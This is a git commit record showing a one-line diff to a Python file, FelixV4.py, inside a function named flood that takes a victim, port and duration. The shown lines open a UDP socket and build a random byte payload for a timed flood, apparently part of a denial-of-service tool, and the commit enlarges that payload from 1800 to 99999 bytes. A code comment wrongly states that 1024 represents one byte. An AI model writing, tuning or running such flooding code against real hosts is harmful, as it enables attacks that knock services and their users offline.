06da733e29f6744aa2ff84f5315173b128d66afd
Maestro <95646935+MaestroXyz@users.noreply.github.com>
2021-12-12 20:48:03 +0700

    99

--- FelixV4.py
+++ FelixV4.py
@@ -13,7 +13,7 @@ def flood(victim, vport, duration):
     # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 1024 representes one byte to the server
-    bytes = random._urandom(1800)
+    bytes = random._urandom(99999)
     timeout =  time.time() + duration
     sent = 999999
 
